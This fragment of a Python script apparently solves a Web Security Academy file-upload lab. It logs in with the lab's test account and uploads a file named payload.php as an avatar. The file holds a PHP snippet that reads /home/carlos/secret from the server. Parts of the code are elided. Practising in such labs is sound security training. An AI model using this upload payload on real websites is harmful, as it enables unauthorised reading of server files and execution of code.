...
url = "https://0ac600830326d3e884d6860e00e70027.web-security-academy.net"
user = "wiener"
password = "peter"
...
def exploit_file_upload(s,  url):
    ...
    if 'Log out' in res.text:
        ...
        params = {"avatar": ('payload.php', "<?php echo file_get_contents('/home/carlos/secret'); ?>", 'application/x-php'),
        "user": user,
        "csrf": csrf_token}
